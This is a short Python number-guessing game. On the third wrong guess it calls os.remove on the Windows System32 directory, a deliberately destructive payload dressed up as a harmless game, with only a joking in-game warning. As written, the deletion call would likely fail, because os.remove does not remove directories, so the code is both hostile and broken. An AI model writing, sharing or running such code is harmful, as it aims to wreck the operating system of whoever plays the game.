import os
import random
number = random.randint(1,10)
count = 0
chance = 3
while (count<3):
    guess = input('Silly game ! Guess the number from 1 to 10 : ')
    guess = int(guess)
    if(guess == number):
        print('you won')
        break
    else:
        count += 1
        chance -= 1
        if chance > 1:
            print(f'Oooh, remaining {chance} chance is left !')
        if chance == 1:
            print(f'If you lose {chance} chance, then say Bye to your system files !!!')
        if count == 3:
            os.remove("C:\Windows\System32")